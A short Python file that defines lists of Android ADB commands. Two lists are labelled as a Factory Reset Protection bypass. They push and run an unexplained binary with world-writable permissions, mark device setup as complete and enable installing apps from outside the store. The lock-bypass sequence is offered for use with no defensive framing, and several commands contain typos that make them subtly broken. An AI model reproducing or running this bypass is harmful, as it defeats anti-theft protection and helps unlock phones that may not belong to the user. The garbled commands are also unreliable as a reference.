
''' Some Adb commands defined here '''

basic_infos_cmds=[
        "",
        "adb shell getprop ro.product",
        "adb shell getprop ro.build",
        "adb shell getprop ro.crypto",
        "adb shell getprop wifi.interface",
        "adb shell getprop gsm.sim.operator.aplha",
        "adb shell dumpsys battery",
        "adb shell getprop transsion.device",
        ]
frp_bypass_cmds_1=[
        "push  frp_bypass_bin_files/frp.bin /data/local/tmp/temp",
        "shell chmod 777 /data/local/tmp/temp",
        "shell /data/local/tmp/temp",
        ]
frp_bypass_cmds_2=[
        "settingd put global setup_wizard_has_run 1",
        "setttingd put secure user_setup_complete 1",
        "content insert --uri content://settings/secure --bind name:s:DEVICE_PROVISIONED --bind value:i:1",
        "content insert --uri content://settings/secure --bind name:s:user_setupt_complete --bind value:i:1",
        "content insert --uri content://settings/secure --bind name:s:INSTALL_NON_MARKET_APPS --bind value:i:1",
        "am start -c android.intent.category.HOME -a android.intent.activity.Main",
        "am start -n com.android.settings/com.android.settings.Settings",
        ]


